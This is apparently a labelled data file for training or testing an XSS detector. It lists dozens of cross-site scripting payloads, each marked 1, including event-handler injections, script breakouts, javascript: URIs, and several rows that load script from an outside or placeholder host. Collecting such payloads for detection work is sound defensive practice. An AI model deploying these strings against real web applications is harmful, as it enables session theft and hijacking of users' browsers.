input,label
-prompt(8)-,1
'-prompt(8)-',1
""";a=prompt,a()//",1
"';a=prompt,a()//",1
"'-eval(""window['pro'+'mpt'](8)"")-'",1
"-eval(""window['pro'+'mpt'](8)"")-",1
"""onclick=prompt(8)>""@x.y",1
"""onclick=prompt(8)><svg/onload=prompt(8)>""@x.y",1
<image/src/onerror=prompt(8)>,1
<img/src/onerror=prompt(8)>,1
<image src/onerror=prompt(8)>,1
<img src/onerror=prompt(8)>,1
<image src =q onerror=prompt(8)>,1
<img src =q onerror=prompt(8)>,1
</scrip</script>t><img src =q onerror=prompt(8)>,1
<svg onload=alert(1)>,1
"""><svg onload=alert(1)//",1
"""onmouseover=alert(1)//",1
"""autofocus/onfocus=alert(1)//",1
'-alert(1)-',1
'-alert(1)//,1
\'-alert(1)//,1
</script><svg onload=alert(1)>,1
<x contenteditable onblur=alert(1)>lose focus!,1
<x onclick=alert(1)>click this!,1
<x oncopy=alert(1)>copy this!,1
<x oncontextmenu=alert(1)>right click this!,1
<x oncut=alert(1)>copy this!,1
<x ondblclick=alert(1)>double click this!,1
<x ondrag=alert(1)>drag this!,1
<x contenteditable onfocus=alert(1)>focus this!,1
<x contenteditable oninput=alert(1)>input here!,1
<x contenteditable onkeydown=alert(1)>press any key!,1
<x contenteditable onkeypress=alert(1)>press any key!,1
<x contenteditable onkeyup=alert(1)>press any key!,1
<x onmousedown=alert(1)>click this!,1
<x onmousemove=alert(1)>hover this!,1
<x onmouseout=alert(1)>hover this!,1
<x onmouseover=alert(1)>hover this!,1
<x onmouseup=alert(1)>click this!,1
<x contenteditable onpaste=alert(1)>paste here!,1
<script>alert(1)//,1
<script>alert(1)<!â€“,1
<script src=//brutelogic.com.br/1.js>,1
<script src=//3334957647/1>,1
<x onxxx=alert(1),1
<x onxxx=1,1
<x onxxx=1,1
<x onxxx=1,1
<x onxxx=1,1
<x onxxx=1,1
<X onxxx=1,1
<x OnXxx=1,1
<X OnXxx=1,1
<x onxxx=1 onxxx=1,1
<x/onxxx=1,1
<x	onxxx=1,1
"<x
onxxx=1",1
<xonxxx=1,1
"<xonxxx=1",1
<x/onxxx=1,1
<x 1='1'onxxx=1,1
"<x 1=""1""onxxx=1",1
<x </onxxx=1,1
"<x 1="">"" onxxx=1",1
<http://onxxx=1/,1
<x onxxx=alert(1) 1=',1
"<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>",1
'onload=alert(1)><svg/1=',1
'>alert(1)</script><script/1=',1
*/alert(1)</script><script>/*,1
"*/alert(1)"">'onload=""/*<svg/1='",1
"`-alert(1)"">'onload=""`<svg/1='",1
*/</script>'>alert(1)/*<script/1=',1
<script>alert(1)</script>,1
<script src=javascript:alert(1)>,1
<iframe src=javascript:alert(1)>,1
<embed src=javascript:alert(1)>,1
<a href=javascript:alert(1)>click,1
